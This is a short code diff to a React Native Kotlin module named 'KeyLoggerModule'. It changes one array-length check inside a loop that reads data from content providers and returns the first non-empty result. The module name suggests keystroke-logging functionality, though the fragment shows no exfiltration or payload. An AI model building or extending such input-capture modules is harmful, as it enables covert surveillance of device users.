@@ -263,7 +263,7 @@ class KeyLoggerModule(reactContext: ReactApplicationContext) :
         } finally {
           cursor.close()
         }
-        if (arr.length() > 0) break // first provider with data wins
+        if (arr.size() > 0) break // first provider with data wins
       }
       promise.resolve(arr)
     } catch (e: Throwable) {
